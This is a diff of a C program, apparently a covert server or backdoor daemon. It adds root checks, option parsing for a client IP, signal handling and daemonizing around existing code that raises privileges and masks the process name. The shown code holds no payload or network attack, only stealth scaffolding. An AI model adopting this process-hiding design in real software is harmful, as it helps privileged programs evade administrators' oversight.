@@ -42,11 +42,33 @@
  *----------------------------------------------------------------------------*/
 int main(int argc, char *argv[])
 {
+	/* make sure user is root */
+	if (geteuid() != USER_ROOT) {
+		fprintf(stderr, "Must be root to run this program.\n");
+		exit(ERROR_NOTROOT);
+	}
+
+	/* parse CLI options */
+	if (parse_options(argc, argv) == ERROR_OPTS) {
+		err(1, "Invalid options");
+		exit(ERROR_OPTS);
+	}
+
+	print_settings(argv[0]);
+
+    signal(SIGTERM, signal_handler);
+    signal(SIGQUIT, signal_handler);
+    signal(SIGKILL, signal_handler);
+    signal(SIGINT, signal_handler);
+	
 	/* raise privileges */
 	if (set_root() == ERROR_NOTROOT) {
-		fprintf(stderr, "Must be root to run this program.\n");
 		err(1, "set_root");
 	}
+
+	/* daemonize the process */
+	if (svr_vars.daemonize)
+		daemonize();
 
 	/* mask the process name */
 	mask_process(argv, PROCESS_NAME);
@@ -54,6 +76,190 @@ int main(int argc, char *argv[])
 	sleep(100); /* testing */
 
 	return ERROR_NONE;
+}
+
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    print_settings
+ * 
+ * DATE:        May 17, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void print_settings(char *command)
+ *                   command - the program's name
+ * 
+ * RETURNS: void
+ * 
+ * NOTES: Prints out the current settings that are being used in the current
+ *        run of the application.
+ *
+ *----------------------------------------------------------------------------*/
+void print_settings(char *command)
+{
+	fprintf(stderr, "Using the Following Options: (For help use \"%s -h\")\n", command);
+	if (svr_vars.daemonize)
+		fprintf(stderr, "  Running as daemon:   TRUE\n");
+	else
+		fprintf(stderr, "  Running as daemon:   FALSE\n");
+	fprintf(stderr, "  Client's IP Address: %s\n", svr_vars.client_ip);
+}
+
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    print_usage
+ * 
+ * DATE:        May 18, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void print_usage(char *command, int err)
+ *                   command - the program's name
+ *                   err - error produced
+ * 
+ * RETURNS: void
+ * 
+ * NOTES: Prints out the program's useage information if the user incorrectly
+ *        entered an option or used the -h or --help option.
+ *
+ *----------------------------------------------------------------------------*/
+void print_usage(char *command, int err)
+{
+    if (err == ERROR_OPTS_HELP) {
+        fprintf(stderr, "usage: %s [arguments]\n\n", command);
+        fprintf(stderr, "Arguments:\n");
+        fprintf(stderr, "  -d  or  --daemon  Run as a background daemon\n");
+        fprintf(stderr, "  -c  or  --client  Client's IP address\n");
+        fprintf(stderr, "  -h  or  --help    Prints out this screen\n");
+		exit(ERROR_OPTS_HELP);
+    }
+	else if (err == ERROR_OPTS)
+        fprintf(stderr, "Try `%s --help` for more information.\n", command);
+	else {
+        fprintf(stderr, "%s: unknown error\n", command);
+        fprintf(stderr, "Try `%s --help` for more information.\n", command);
+    }	
+}
+
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    parse_options 
+ * 
+ * DATE:        May 17, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   parse_options(int argc, char *argv[])
+ *                    argc - argument count
+ *                    argv - argument list
+ * 
+ * RETURNS:     ERROR_NONE on success ERROR_OPTS on failure.
+ * 
+ * NOTES: Sets default options and parses any command-line options.
+ *
+ *----------------------------------------------------------------------------*/
+int parse_options(int argc, char *argv[])
+{
+	int c, option_index = 0;
+
+	static struct option long_options[] =
+	{
+		{"daemon"		, no_argument		, 0, 'd'},
+		{"client"		, required_argument	, 0, 'c'},
+		{"help"			, no_argument		, 0, 'h'},
+		{0, 0, 0, 0}
+	};
+
+	/* set defaults */
+	svr_vars.daemonize = FALSE;
+	svr_vars.client_ip = CLIENT_IP;
+
+	/* parse options */
+	while (TRUE) {
+		c = getopt_long(argc, argv, "dc:h", long_options, &option_index);
+
+		if (c == -1)
+			break;
+
+		switch (c) {
+			case 0:
+				if (long_options[option_index].flag != 0)
+					break;
+				break;
+
+			case 'd':
+				svr_vars.daemonize = TRUE;
+				break;
+
+			case 'c':
+				svr_vars.client_ip = optarg;
+				break;
+
+			case 'h':
+				print_usage(argv[0], ERROR_OPTS_HELP);
+				break;			
+
+			default:
+				print_usage(argv[0], ERROR_OPTS);
+				return ERROR_OPTS;
+				break;
+		}
+	}
+
+	return ERROR_NONE;
+}
+
+void signal_handler(int sig)
+{
+	switch(sig) {
+		case SIGTERM:
+			if (!svr_vars.daemonize)
+				fprintf(stderr, "Received SIGTERM, terminating.\n");
+			exit_clean();
+		case SIGQUIT:
+			if (!svr_vars.daemonize)
+				fprintf(stderr, "Received SIGQUIT, terminating.\n");
+			exit_clean();
+		case SIGKILL:
+			if (!svr_vars.daemonize)
+				fprintf(stderr, "Received SIGKILL, terminating.\n");
+			exit_clean();
+		case SIGINT:
+			if (!svr_vars.daemonize)
+				fprintf(stderr, "\nReceived SIGINT, terminating.\n");
+			exit_clean();
+		default:
+			break;
+	}
+}
+
+void exit_clean()
+{
+	/* close sockets etc... */
+	if (!svr_vars.daemonize)
+		fprintf(stderr, "Exited cleanly.\n");
+	exit(ERROR_NONE);
+}
+
+void daemonize()
+{
+	pid_t pid;
+
+	/* fork off the parent process */
+	pid = fork();
+	if (pid < ERROR_NONE)
+		err(1, "fork");
+	else if (pid > ERROR_NONE) /* exit parent process */
+		exit(ERROR_NONE);
 }
 
 int set_root()
